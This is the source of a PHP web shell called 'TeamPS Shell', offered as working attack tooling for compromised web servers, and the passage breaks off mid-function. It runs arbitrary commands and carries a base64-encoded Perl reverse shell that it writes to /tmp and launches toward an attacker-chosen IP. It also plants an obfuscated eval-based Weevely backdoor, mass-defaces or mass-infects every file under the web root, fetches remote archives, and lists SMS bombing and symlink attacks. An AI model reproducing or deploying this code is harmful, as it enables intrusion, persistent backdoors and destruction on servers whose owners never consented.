<?php
//TeamPS Shell
//By Plum & KrypTiK
error_reporting(0);
#chdir('');
//Some basic var's
if (!@$_GET['path']) {
    $dir = CleanDir(getcwd());
} else {
    $dir = CleanDir($_GET['path']);
}
$rootdir = CleanDir($_SERVER['DOCUMENT_ROOT']);
$domain = $_SERVER['HTTP_HOST'];
$script = $_SERVER['SCRIPT_NAME'];
$full_url = $_SERVER['REQUEST_URI'];
$script2 = basename($script);
$serverip = $_SERVER['SERVER_ADDR'];
$userip = $_SERVER['REMOTE_ADDR'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami");
$disabled = ini_get('disable_functions');
//Perl back connect script by LorD
//Encoded in base64 for convenience
$bcperl_source = "IyEvdXNyL2Jpbi9wZXJsIA0KdXNlIElPOjpTb2NrZXQ7IA0KIyAgIFByaXY4ICoqIFByaXY4ICoqIFByaXY4IA0KIyBJUkFOIEhBQ0tFUlMgU0FCT1RBR0UgQ29ubmVjdCBCYWNrIFNoZWxsICAgICAgICAgIA0KIyBjb2RlIGJ5OkxvckQgDQojIFdlIEFyZSA6TG9yRC1DMGQzci1OVC1ceDkwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiMgRW1haWw6TG9yREBpaHN0ZWFtLmNvbSANCiMgDQojbG9yZEBTbGFja3dhcmVMaW51eDovaG9tZS9wcm9ncmFtaW5nJCBwZXJsIGRjLnBsIA0KIy0tPT0gQ29ubmVjdEJhY2sgQmFja2Rvb3IgU2hlbGwgdnMgMS4wIGJ5IExvckQgb2YgSVJBTiBIQUNLRVJTIFNBQk9UQUdFID09LS0gDQojIA0KI1VzYWdlOiBkYy5wbCBbSG9zdF0gW1BvcnRdIA0KIyANCiNFeDogZGMucGwgMTI3LjAuMC4xIDIxMjEgDQojbG9yZEBTbGFja3dhcmVMaW51eDovaG9tZS9wcm9ncmFtaW5nJCBwZXJsIGRjLnBsIDEyNy4wLjAuMSAyMTIxIA0KIy0tPT0gQ29ubmVjdEJhY2sgQmFja2Rvb3IgU2hlbGwgdnMgMS4wIGJ5IExvckQgb2YgSVJBTiBIQUNLRVJTIFNBQk9UQUdFID09LS0gDQojIA0KI1sqXSBSZXNvbHZpbmcgSG9zdE5hbWUgDQojWypdIENvbm5lY3RpbmcuLi4gMTI3LjAuMC4xIA0KI1sqXSBTcGF3bmluZyBTaGVsbCANCiNbKl0gQ29ubmVjdGVkIHRvIHJlbW90ZSBob3N0IA0KDQojYmFzaC0yLjA1YiMgbmMgLXZ2IC1sIC1wIDIxMjEgDQojbGlzdGVuaW5nIG9uIFthbnldIDIxMjEgLi4uIA0KI2Nvbm5lY3QgdG8gWzEyNy4wLjAuMV0gZnJvbSBsb2NhbGhvc3QgWzEyNy4wLjAuMV0gMzI3NjkgDQojLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciB2cyAxLjAgYnkgTG9yRCBvZiBJUkFOIEhBQ0tFUlMgU0FCT1RBR0UgPT0tLSANCiMgDQojLS09PVN5c3RlbWluZm89PS0tIA0KI0xpbnV4IFNsYWNrd2FyZUxpbnV4IDIuNi43ICMxIFNNUCBUaHUgRGVjIDIzIDAwOjA1OjM5IElSVCAyMDA0IGk2ODYgdW5rbm93biB1bmtub3duIEdOVS9MaW51eCANCiMgDQojLS09PVVzZXJpbmZvPT0tLSANCiN1aWQ9MTAwMShsb3JkKSBnaWQ9MTAwKHVzZXJzKSBncm91cHM9MTAwKHVzZXJzKSANCiMgDQojLS09PURpcmVjdG9yeT09LS0gDQojL3Jvb3QgDQojIA0KIy0tPT1TaGVsbD09LS0gDQojIA0KJHN5c3RlbSAgID0gJy9iaW4vYmFzaCc7IA0KJEFSR0M9QEFSR1Y7IA0KcHJpbnQgIklIUyBCQUNLLUNPTk5FQ1QgQkFDS0RPT1JcblxuIjsgDQppZiAoJEFSR0MhPTIpIHsgDQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7IA0KICAgZGllICJFeDogJDAgMTI3LjAuMC4xIDIxMjEgXG4iOyANCn0gDQp1c2UgU29ja2V0OyANCnVzZSBGaWxlSGFuZGxlOyANCnNvY2tldChTT0NLRVQsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCBnZXRwcm90b2J5bmFtZSgndGNwJykpIG9yIGRpZSBwcmludCAiWy1dIFVuYWJsZSB0byBSZXNvbHZlIEhvc3RcbiI7IA0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdFxuIjsgDQpwcmludCAiWypdIFJlc29sdmluZyBIb3N0TmFtZVxuIjsgDQpwcmludCAiWypdIENvbm5lY3RpbmcuLi4gJEFSR1ZbMF0gXG4iOyANCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOyANCnByaW50ICJbKl0gQ29ubmVjdGVkIHRvIHJlbW90ZSBob3N0IFxuIjsgDQpTT0NLRVQtPmF1dG9mbHVzaCgpOyANCm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOyANCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOyANCm9wZW4oU1RERVJSLCI+JlNPQ0tFVCIpOyANCnByaW50ICJJSFMgQkFDSy1DT05ORUNUIEJBQ0tET09SICBcblxuIjsgDQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVCA7ZWNobyAtLT09U3lzdGVtaW5mbz09LS0gOyB1bmFtZSAtYTtlY2hvOyANCmVjaG8gLS09PVVzZXJpbmZvPT0tLSA7IGlkO2VjaG87ZWNobyAtLT09RGlyZWN0b3J5PT0tLSA7IHB3ZDtlY2hvOyBlY2hvIC0tPT1TaGVsbD09LS0gIik7IA0Kc3lzdGVtKCRzeXN0ZW0pOyANCiNFT0Y=";
@ini_set("memory_limit", "9999M");
@ini_set("max_execution_time", "0");
@ini_set("upload_max_filesize", "9999m");
@ini_set("magic_quotes_gpc", "0");
@set_magic_quotes_runtime(0);
set_time_limit(0);
if (empty($disabled)) {
    $disabled = "None";
}
//Some functions
function CleanDir($directory) {
    $directory = str_replace("\\", "/", $directory);
    $directory = str_replace("//", "/", $directory);
    return $directory;
}
function success($for, $var1) {
    $domain = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME'];
    $full_url = $_SERVER['REQUEST_URI'];
    if ($for == "filesave") {
        $message = "File Saved!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "filedelete") {
        $message = "File Deleted!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "createdir") {
        $message = "Directory Created!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "dir_exists") {
        $message = "Directory Already Exists!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "file_exists") {
        $message = "File Already Exists!";
        $redirect = "http://$domain$script?editfile=$var1";
    }
    if ($for == "file_created") {
        $message = "File Created!";
        $redirect = "http://$domain$script?editfile=$var1";
    }
    if ($for == "file_uploaded") {
        $message = "File Uploaded!";
        $redirect = "http://$domain$full_url";
    }
    if ($for == "shell_killed") {
        $message = "Shell Killed!";
        $redirect = "http://$domain$script";
    }
    if ($for == "dir_del") {
        $message = "Directory Deleted!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "dir_renamed") {
        $message = "Directory Renamed!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "file_renamed") {
        $message = "File Renamed!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "configs_found") {
        $message = "$var1 Configs Found!";
        $redirect = "";
    }
    if ($for == "unzip") {
        $message = "Successfully Unzipped File!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "files_found") {
        $message = "$var1 files found!";
        $redirect = "";
    }
    if ($for == "weevely") {
        $message = "Weevely BackDoor Installed!";
        $redirect = "";
    }
    echo "<div id='xbox'><embed
   src='http://p0wersurge.com/js/achievementnopic.swf'
   width='300'
   height='80'
   flashvars='Text=$message&gs=1337'
   wmode='transparent'/></div>";
    if (empty($redirect)) {
        echo "<script>
function remove (){
 document.getElementById('xbox').innerHTML='';
}
setInterval(function(){remove();}, 2700);
</script>";
    } else {
        echo "<script>
function remove (){
 window.location = '$redirect'
}
setInterval(function(){remove();}, 2500);
</script>";
    }
}
function error($mesg) {
    $error = "<center><font size='4' color='red'><b>$mesg</b></font></center>";
    echo "$error";
}
function ByteConversion($bytes, $precision = 2) {
    $kilobyte = 1024;
    $megabyte = $kilobyte * 1024;
    $gigabyte = $megabyte * 1024;
    $terabyte = $gigabyte * 1024;
    if (($bytes >= 0) && ($bytes < $kilobyte)) {
        return $bytes . ' B';
    } elseif (($bytes >= $kilobyte) && ($bytes < $megabyte)) {
        return round($bytes / $kilobyte, $precision) . ' KB';
    } elseif (($bytes >= $megabyte) && ($bytes < $gigabyte)) {
        return round($bytes / $megabyte, $precision) . ' MB';
    } elseif (($bytes >= $gigabyte) && ($bytes < $terabyte)) {
        return round($bytes / $gigabyte, $precision) . ' GB';
    } elseif ($bytes >= $terabyte) {
        return round($bytes / $terabyte, $precision) . ' TB';
    } else {
        return $bytes . ' B';
    }
}
//Mass File Function
function files($mass_dir) {
    if ($dh = opendir($mass_dir)) {
        $files = array();
        $inner_files = array();
        while ($file = readdir($dh)) {
            if ($file != "." && $file != ".." && $file[0] != '.') {
                if (is_dir($mass_dir . "/" . $file)) {
                    $inner_files = files("$mass_dir/$file");
                    if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, "$mass_dir/$file");
                }
            }
        }
        closedir($dh);
        return $files;
    }
}
//Execute command
function cmd2($cmd, $path) {
    chdir($path);
    $disabled = ini_get('disable_functions');
    if (empty($disabled)) {
        $disabled = "None";
    }
    if ($disabled == "None") {
        $execute = proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while (!feof($io[1])) {
            $res.= htmlspecialchars(fgets($io[1]), ENT_COMPAT, 'UTF-8');
        }
        while (!feof($io[2])) {
            $res.= htmlspecialchars(fgets($io[2]), ENT_COMPAT, 'UTF-8');
        }
        fclose($io[1]);
        fclose($io[2]);
        proc_close($execute);
        return $res;
    } elseif (function_exists("proc_open")) {
        $execute = proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while (!feof($io[1])) {
            $res.= htmlspecialchars(fgets($io[1]), ENT_COMPAT, 'UTF-8');
        }
        while (!feof($io[2])) {
            $res.= htmlspecialchars(fgets($io[2]), ENT_COMPAT, 'UTF-8');
        }
        fclose($io[1]);
        fclose($io[2]);
        proc_close($execute);
        return $res;
    } elseif (function_exists("exec")) {
        $res = exec($cmd);
        return $res;
    } elseif (function_exists("system")) {
        $res = system($cmd);
        return $res;
    } elseif (function_exists("shell_exec")) {
        $res = shell_exec($cmd);
        return $res;
    } elseif (function_exists("passthru")) {
        $res = passthru($cmd);
        return $res;
    } else {
        error("The necessary functions to execute commands are disabled!");
    }
}
//Salt generator
function gen_salt($length) {
    $characters = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $i = 0;
    $salt = "";
    while ($i < $length) {
        $arrand = array_rand($characters, 1);
        $salt.= $characters[$arrand];
        $i++;
    }
    return $salt;
}
//Unzip function
function unzip($filename, $directory) {
    $zip = new ZipArchive;
    $res = $zip->open($filename);
    if ($res === TRUE) {
        $zip->extractTo($directory);
        $zip->close();
        success("unzip", $directory);
    } else {
        cmd2("unzip $filename", $directory);
    }
}
//Get files and directories and throw them into an array.
$open = opendir($dir);
$files = array();
$direcs = array();
while ($file = readdir($open)) {
    if ($file != "." && $file != "..") {
        if (is_dir("$dir/$file")) {
            array_push($direcs, $file);
        } else {
            array_push($files, $file);
        }
    }
}
asort($direcs);
asort($files);
//echo out header
echo "<pre>
<center>
<font size='2' color='#14ab00'>
TTTTTTTTTTTTTTTTTTTTTTT                                                        PPPPPPPPPPPPPPPPP      SSSSSSSSSSSSSSS 
T:::::::::::::::::::::T                                                        P::::::::::::::::P   SS:::::::::::::::S
T:::::::::::::::::::::T                                                        P::::::PPPPPP:::::P S:::::SSSSSS::::::S
T:::::TT:::::::TT:::::T                                                        PP:::::P     P:::::PS:::::S     SSSSSSS
TTTTTT  T:::::T  TTTTTTeeeeeeeeeeee    aaaaaaaaaaaaa      mmmmmmm    mmmmmmm     P::::P     P:::::PS:::::S            
        T:::::T      ee::::::::::::ee  a::::::::::::a   mm:::::::m  m:::::::mm   P::::P     P:::::PS:::::S            
        T:::::T     e::::::eeeee:::::eeaaaaaaaaa:::::a m::::::::::mm::::::::::m  P::::PPPPPP:::::P  S::::SSSS         
        T:::::T    e::::::e     e:::::e         a::::a m::::::::::::::::::::::m  P:::::::::::::PP    SS::::::SSSSS    
        T:::::T    e:::::::eeeee::::::e  aaaaaaa:::::a m:::::mmm::::::mmm:::::m  P::::PPPPPPPPP        SSS::::::::SS  
        T:::::T    e:::::::::::::::::e aa::::::::::::a m::::m   m::::m   m::::m  P::::P                   SSSSSS::::S 
        T:::::T    e::::::eeeeeeeeeee a::::aaaa::::::a m::::m   m::::m   m::::m  P::::P                        S:::::S
        T:::::T    e:::::::e         a::::a    a:::::a m::::m   m::::m   m::::m  P::::P                        S:::::S
      TT:::::::TT  e::::::::e        a::::a    a:::::a m::::m   m::::m   m::::mPP::::::PP          SSSSSSS     S:::::S
      T:::::::::T   e::::::::eeeeeeeea:::::aaaa::::::a m::::m   m::::m   m::::mP::::::::P          S::::::SSSSSS:::::S
      T:::::::::T    ee:::::::::::::e a::::::::::aa:::am::::m   m::::m   m::::mP::::::::P          S:::::::::::::::SS 
      TTTTTTTTTTT      eeeeeeeeeeeeee  aaaaaaaaaa  aaaammmmmm   mmmmmm   mmmmmmPPPPPPPPPP           SSSSSSSSSSSSSSS   
<a class ='navbar' href='http://p0wersurge.com'>p0wersurge</a> &copy;2012								Plum & KrypTiK
																								                      
</font>
</center>
</pre>";
//echo out system info misc bar
echo "<table border='1' width='100%'>
<tr>
<th>User</th>
<th>System</th>
<th>Server Software</th>
<th>safe_mode</th>
<th>open_basedir</th>
<th>Disable Functions</th>
<th>Your IP</th>
<th>Server IP</th>
</tr>";
$system = php_uname();
$software = $_SERVER['SERVER_SOFTWARE'];
if (strpos($software, "Win") != FALSE) {
    $whoami = strstr($whoami, "\\");
    $whoami = substr($whoami, 1);
}
$safemode = ini_get('safe_mode');
if ($safemode) {
    $safemode = "Enabled";
} else {
    $safemode = "Disabled";
}
$openbase = ini_get('open_basedir');
if ($openbase) {
    $openbase = "Enabled";
} else {
    $openbase = "Disabled";
}
echo "<tr>
<td>$whoami</td>
<td>$system</td>
<td>$software</td>
<td>$safemode</td>
<td>$openbase</td>
<td>$disabled</td>
<td>$userip</td>
<td>$serverip</td>
</tr>
</table>
<br>";
//Navbar will go here.
//Basic for now
echo "<center><font size='4' color='#14ab00'><b>
[~<a href='http://$domain$script' class='navbar'>Home</a>~] 
[~<a href='http://$domain$script?installMySQL' class='navbar'>Install MSD</a>~] 
[~<a href='http://$domain$script?massdeface' class='navbar'>Mass Deface</a>~] 
[~<a href='http://$domain$script?massinfect' class='navbar'>Mass File Infect</a>~] 
[~<a href='http://$domain$script?config' class='navbar'>Config Finder</a>~] 
[~<a href='http://$domain$script?search' class='navbar'>File Search</a>~] 
[~<a href='http://$domain$script?encrypt' class='navbar'>Encrypt String</a>~] 
[~<a href='http://$domain$script?kill' class='navbar'>Kill</a>~]<br> 
</font>
<font size='3.5' color='#14ab00'>
[~<a href='http://$domain$script?sms' class='navbar'>SMS Bomber</a>~] 
[~<a href='http://$domain$script?domaininfo' class='navbar'>Domain Information</a>~] 
[~<a href='http://$domain$script?back' class='navbar'>Back Connect</a>~] 
[~<a href='http://$domain$script?weev' class='navbar'>Weevely Backdoor</a>~] 
[~<a href='http://$domain$script?symlink' class='navbar'>Symlink</a>~] 
[~<a href='http://$domain$script?scan' class='navbar'>Port Scan</a>~] 
</b></font></center><br>";
//End navbar
//Anything you want echo'd out between misc system bar
//and misc file bar put below here!
//Back connect
if (isset($_GET['back'])) {
    echo "
		<form method='POST'>
			<center>
			<font color='#14ab00'>
				IP: <input type='text' class='text' name='ip' value='$userip' />
				Port: <input type='text' class='text' name='port' value='2121' size='3'/><br>
				<input type='submit' name='backC' value='Connect' />
				</font>
			</center>
		</form>
	";
    if (isset($_POST['backC'])) {
        $port = $_POST['port'];
        $bcip = $_POST['ip'];
        $bc_decode = base64_decode($bcperl_source);
        if (is_dir('/tmp')) {
            if (file_put_contents("/tmp/bc.pl", $bc_decode)) {
                $bc_command = "perl /tmp/bc.pl $bcip $port";
                cmd2($bc_command, $dir);
                echo "<center><font color='#14ab00' size='3'>Trying to connect!</font></center><br>";
            } else {
                error("Failed to write perl script to /tmp!");
            }
        } elseif (is_writeable($dir)) {
            if (file_put_contents("$dir/bc.pl", $bc_decode)) {
                $bc_command = "perl $dir/bc.pl $bcip $port";
                cmd2($bc_command, $dir);
                echo "<center><font color='#14ab00' size='3'>Trying to connect!</font></center><br>";
            } else {
                error("Failed to write perl script to $dir!");
            }
        } else {
            error("/tmp does not exist and current directory is not writable!");
        }
    }
}
//Weevely backdoor
if (isset($_GET['weev'])) {
    echo "<center><font color='#14ab00' size='3'>
<form action='' method='post'>
Directory to install weevely backdoor:<br>
<input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
Name of file (something .php):<br>
<input type='text' name='weev_name' class='text' value='weevely.php'><br>
Password (more than 3 characters):<br>
<input type='text' name='weev_pass' class='text'><br>
<input type='submit' name='install_weev' value='BackDoor'><br>
</font>
</center>";
}
if (isset($_POST['install_weev'])) {
    $weevdir = rtrim($_POST['weev_dir'], '/');;
    $weevname = $_POST['weev_name'];
    $weevpassword = $_POST['weev_pass'];
    if (strlen($weevpassword) < 3) {
        error("Password must be longer than 3 characters!");
    } else {
        $first2 = $weevpassword[0] . $weevpassword[1];
        $rest = substr($weevpassword, 2);
        $money = "$";
        $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
        $weevelybd2 = "if(reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
        $weevelybd3 = "$money" . "k='$rest';";
        $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
        $all = "<?php\neval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "'));\n?>";
        if (file_put_contents($weevdir . '/' . $weevname, $all)) {
            echo "<center><font color='#14ab00' size='3'>Usage: weevely [URL of backdoor] [password]</font></center><br>";
            success("weevely");
        } else {
            error("Failed to write backdoor to $weevdir");
        }
    }
}
//Edit file stuff
if (!empty($_GET['editfile'])) {
    $edfile = $_GET['editfile'];
    $redirectloc = dirname($edfile);
    echo "<form method='POST'><center>";
    if (file_exists($edfile)) {
        if (get_magic_quotes_gpc()) {
            $file_content = htmlspecialchars(stripslashes(file_get_contents($edfile)));
        } else {
            $file_content = htmlspecialchars(file_get_contents($edfile));
        }
        if (is_writeable($edfile)) {
            echo "<textarea rows='20' cols='150' name='edfile_contents' style='color:#000000'>$file_content</textarea>
<br><br>
        <input type='submit' name='savedit' value='Save' />
        <input type='submit' name='deletefile' value='Delete' />
        </form></center>";
            if (isset($_POST['savedit'])) {
                if (get_magic_quotes_gpc()) {
                    $edfilecontent = stripslashes($_POST['edfile_contents']);
                } else {
                    $edfilecontent = $_POST['edfile_contents'];
                }
                if (file_put_contents($edfile, $edfilecontent)) {
                    success("filesave", rtrim($redirectloc, "/"));
                } else {
                    error("Failed to save file!");
                }
            } else if (isset($_POST['deletefile'])) {
                if (unlink($edfile)) {
                    success("filedelete", rtrim($redirectloc, '/'));
                } else {
                    error("Failed to delete file!");
                }
            }
        } else {
            echo "<font color='red'><b>File is read only!</b></font><br>
<textarea readonly rows='20' cols='150' name='edfile_contents'>$file_content</textarea><br><br>";
        }
        echo "</center>";
    } else {
        echo "<form method='POST'><center>";
        echo "<font color='red'><b>File does not exist!</b></font><br>
<textarea rows='20' cols='150' name='newfile_contents' style='color:#000'>
</textarea><br><br>
 <input type='submit' name='savefile' value='Create File' /><br /><br />
        </form></center>";
        if (isset($_POST['savefile'])) {
            if (get_magic_quotes_gpc()) {
                $newfilecontent = stripslashes($_POST['newfile_contents']);
            } else {
                $newfilecontent = $_POST['newfile_contents'];
            }
            if (file_put_contents($edfile, $newfilecontent)) {
                success("filesave", rtrim($redirectloc, "/"));
            } else {
                error("Failed to save file!");
            }
        }
    }
}
//Make directory stuff
if (isset($_POST['do_create_dir'])) {
    $cdir = $_POST['create_dir'];
    if (is_dir($cdir)) {
        success("dir_exists", $cdir);
    } else {
        if (mkdir($cdir, 0777)) {
            success("createdir", $cdir);
        } else {
            error("Directory was not created!");
        }
    }
}
//Make file stuff
if (isset($_POST['do_create_file'])) {
    $cfile = $_POST['create_file'];
    if (file_exists($cfile)) {
        success("file_exists", $cfile);
    } else {
        if (fopen($cfile, "w+")) {
            success("file_created", $cfile);
        } else {
            error("File was not created");
        }
    }
}
//Go directory
if (isset($_POST['do_go_dir'])) {
    $godir = $_POST['go_dir'];
    echo "<script>window.location = 'http://$domain$script?path=$godir'</script>";
}
//Go Edit file
if (isset($_POST['do_go_edit'])) {
    $gefile = $_POST['go_edit_file'];
    if (file_exists($gefile)) {
        header("Location: http://$domain$script?editfile=$gefile");
    } else {
        error("File does not exist!");
    }
}
//Upload File
if (isset($_POST['do_upload_file'])) {
    $udir = $_POST['upload_location'];
    $uname = $_FILES['upload_file']['name'];
    $both = "$udir$uname";
    if (file_exists($both)) {
        success("file_exists", $both);
    } else {
        switch ($_FILES['upload_file']['error']) {
            case 0:
                if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $udir . '/' . $uname)) {
                    success("file_uploaded");
                } else {
                    error("Failed To Upload File!");
                }
        }
    }
}
//Kill Shell
if (isset($_GET['kill'])) {
    if (unlink("$dir/$script2")) {
        success("shell_killed");
    } else {
        error("Failed to kill shell!");
    }
}
//Install MySQL Tool
if (isset($_GET['installMySQL'])) {
    echo "<center>
<font size='4'>
<a href='?msd1' class='navbar'>Install MySQL Dumper v2.0 By: Plum</a>
<br>
<br>
<a href='?msd2' class='navbar'>Install MySQL Dumper v1.24.4 (Original MSD)</a>
</font>
</center>
<br>";
}
//MSD 1 stuff
if (isset($_GET['msd1'])) {
    echo "<center>
<font color='#14ab00' size='3'>
Directory to install to:<br>
If directory does not exist it will attempt to create it.
<form action='' method='post'>
<input type='text' name='msd1dir' class='text' size='50' value='$dir/msd'>
<input type='submit' name='installmsd1' value='Install'>
<form>
</font>
</center>
<br>";
}
if (isset($_POST['installmsd1'])) {
    $msd1dir = rtrim($_POST['msd1dir'], "/");
    $msd1dir2 = "$msd1dir/msdv2.zip";
    if (!is_dir($msd1dir)) {
        if (!mkdir($msd1dir, 0777)) {
            error("Failed to make directory $msd1dir");
        }
    }
    $link = file_get_contents("http://p0wersurge.com/msdv2.zip");
    if (file_put_contents($msd1dir2, $link)) {
        unzip($msd1dir2, $msd1dir);
    } else {
        error("Could not write to $msd1dir");
    }
}
//MSD 2 stuff
if (isset($_GET['msd2'])) {
    echo "<center>
<font color='#14ab00' size='3'>
Directory to install to:<br>
If directory does not exist it will attempt to create it.
<form action='' method='post'>
<input type='text' name='msd2dir' class='text' size='50' value='$dir/msd'>
<input type='submit' name='installmsd2' value='Install'>
<form>
</font>
</center>
<br>";
}
if (isset($_POST['installmsd2'])) {
    $msd2dir = rtrim($_POST['msd2dir'], "/");
    $msd2dir2 = "$msd2dir/msd.zip";
    if (!is_dir($msd2dir)) {
        if (!mkdir($msd2dir, 0777)) {
            error("Failed to make directory $msd2dir");
        }
    }
    $link = file_get_contents("http://p0wersurge.com/msd.zip");
    if (file_put_contents($msd2dir2, $link)) {
        unzip($msd2dir2, $msd2dir);
    } else {
        error("Could not write to $msd2dir");
    }
}
//Delete Directory
if (isset($_GET['deldir'])) {
    $deldir = $_GET['deldir'];
    $redir = dirname($deldir);
    if (rmdir($deldir)) {
        success("dir_del", rtrim($redir, '/'));
    } else {
        error("Failed to delete directory!");
    }
}
//Rename Directory
if (isset($_GET['rendir'])) {
    $rendir = $_GET['rendir'];
    $dend = $_GET['old'];
    echo "<center>
<form action='' method='post'>
<input type='text' class='text' name='new_dir_name' value='$dend'>
<input type='submit' name='do_rename_dir' value='Rename'>
</center>";
}
if (isset($_POST['do_rename_dir'])) {
    $newdir = $_POST['new_dir_name'];
    $rendir = $_GET['rendir'];
    $dend = $_GET['old'];
    if (rename("$rendir/$dend", "$rendir/$newdir")) {
        success("dir_renamed", $rendir);
    } else {
        error("Directory was not renamed!");
    }
}
//Delete file
if (isset($_GET['delfile'])) {
    $delfile = $_GET['delfile'];
    $redir = dirname($delfile);
    if (unlink($delfile)) {
        success("filedelete", rtrim($redir, '/'));
    } else {
        error("Failed to delete file!");
    }
}
//Rename File
if (isset($_GET['renfile'])) {
    $renfile = $_GET['renfile'];
    $fend = $_GET['old'];
    echo "<center>
<form action='' method='post'>
<input type='text' class='text' name='new_file_name' value='$fend'>
<input type='submit' name='do_rename_file' value='Rename'>
</center>";
}
if (isset($_POST['do_rename_file'])) {
    $newfile = $_POST['new_file_name'];
    $renfile = $_GET['renfile'];
    $fend = $_GET['old'];
    if (rename("$renfile/$fend", "$renfile/$newfile")) {
        success("file_renamed", $renfile);
    } else {
        error("File was not renamed!");
    }
}
//Mass Files Stuff
if (isset($_POST['mass_files'])) {
    $action = $_POST['mass_action'];
    $chmodvalue = $_POST['chmod_value'];
    $box = $_POST['delbox'];
    if ($action == "Delete") {
        foreach ($box as $b) {
            if (is_dir($b)) {
                if (rmdir($b)) {
                    echo "<font color='green'>Deleted Directory: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Delete Directory: $b</font><br>";
                }
            } else {
                if (unlink($b)) {
                    echo "<font color='green'>Deleted File: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Delete file: $b</font><br>";
                }
            }
        }
    }
    if ($action == "chmod") {
        foreach ($box as $b) {
            if (is_dir($b)) {
                if (chmod($b, $chmodvalue)) {
                    echo "<font color='green'>Changed Permissions Of Directory: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Change Permissions Of Directory: $b</font><br>";
                }
            } else {
                if (chmod($b, $chmodvalue)) {
                    echo "<font color='green'>Changed Persmissions Of File: $b</font><br>";
                } else {
                    echo "<font color='red'>Failed To Change Permissions Of File: $b</font><br>";
                }
            }
        }
    }
}
//Mass Defacer
if (isset($_POST['do_mass_deface'])) {
    if (get_magic_quotes_gpc()) {
        $mass_source = stripslashes($_POST['massdeface_source']);
    } else {
        $mass_source = $_POST['massdeface_source'];
    }
    $def_dir = $_POST['deface_dir'];
    $custom_dir = $_POST['custom_dir'];
    $custom_dir = rtrim($custom_dir, "/");
    $failed = 0;
    $success = 0;
    if (empty($mass_source)) {
        error("You must enter a source!");
    } elseif (empty($custom_dir) && $def_dir == "custom") {
        error("You must enter a custom directory when using the Custom option!");
    } else {
        if ($def_dir == "root") {
            $mddir = $rootdir;
        }
        if ($def_dir == "custom") {
            $mddir = $custom_dir;
        }
        foreach (files($mddir) as $key => $file) {
            $file2 = trim($file, ".");
            if ("$file2" == "$dir/$script2") {
                echo "";
            } else {
                if (file_put_contents("$file2", $mass_source)) {
                    echo "<font color='green'><b>Successfully defaced file: $file2</b></font><br>";
                    $success++;
                } else {
                    echo "<font color='red'><b>Failed to deface file: $file2</b></font><br>";
                    $failed++;
                }
            }
        }
        echo "<font color='#14ab00'><b>$success files successfully defaced!<br>Failed to deface $failed files!</b></font><br>";
    }
}
if (isset($_GET['massdeface'])) {
    echo "<center>
<font color='#14ab00'>
<form action='' method='post'>
Directory to start deface from:<br>
<select name='deface_dir'>
<option value='root'>Root</option>
<option value='custom'>Custom</option>
</select><br>
Custom Directory: <input class='text' type='text' name='custom_dir' size='40'><br>
Source of deface:<br>
<textarea rows='20' cols='150' name='massdeface_source' style='color:#000'>
</textarea><br>
This will not deface this shell.<br>
<input type='submit' name='do_mass_deface' value='Deface'><br>
</form>
</font>
</center>";
}
//Mass file infect
if (isset($_POST['do_mass_infect'])) {
    $masscode = " " . $_POST['massinfect_code'] . "\n";
    $inf_dir = $_POST['infect_dir'];
    $infcustom_dir = $_POST['cinfect_dir'];
    $infcustom_dir = rtrim($infcustom_dir, "/");
    $failed = 0;
    $success = 0;
    if (empty($masscode)) {
        error("You must enter a code to infect files with!");
    } elseif (empty($infcustom_dir) && $inf_dir == "custom") {
        error("You must enter a custom directory when using the Custom option!");
    } else {
        if ($inf_dir == "root") {
            $mddir = $rootdir;
        }
        if ($inf_dir == "custom") {
            $mddir = $infcustom_dir;
        }
        foreach (files($mddir) as $key => $file) {
